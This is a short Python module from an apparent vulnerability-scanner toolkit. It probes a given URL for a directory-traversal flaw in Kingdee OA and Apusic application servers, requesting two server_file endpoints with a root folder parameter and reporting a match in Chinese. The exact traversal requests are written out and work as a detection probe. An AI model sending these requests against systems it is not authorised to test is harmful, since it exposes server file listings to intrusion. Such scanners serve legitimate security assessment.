#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests

class jindie:

    def __init__(self):
        pass

    def ALL(self,args):
        self.url=args
        self.results=[]
        self.results.append(self.url)
        self.pscan_vuln()
        self.pscan_vuln1()
        return self.results

    def pscan_vuln(self):
        urls = self.url
        global results
        try:
            response = requests.get(url=self.url + '/admin/protected/selector/server_file/files?folder=/', verify=False,
                                    timeout=20)
            bm = response.encoding  # 获取网页编码
            response.encoding = str(bm)  # 设置网页编码
            if '"folder":true' in response.text:
                self.results.append(f'->存在金蝶OAApusic应用服务器(中间件)server_file目录遍历漏洞')
            else:
                pass
        except:
            pass

    def pscan_vuln1(self):
        urls = self.url
        global results
        try:
            response = requests.get(url=self.url + '/appmonitor/protected/selector/server_file/files?folder=/&suffix=',
                                    verify=False, timeout=20)
            bm = response.encoding  # 获取网页编码
            response.encoding = str(bm)  # 设置网页编码
            if 'application_log.html' in response.text or '"folder":true' in response.text:

                self.results.append(f'->存在金蝶OAserver_file目录遍历漏洞')
            else:
                pass
        except:
            pass

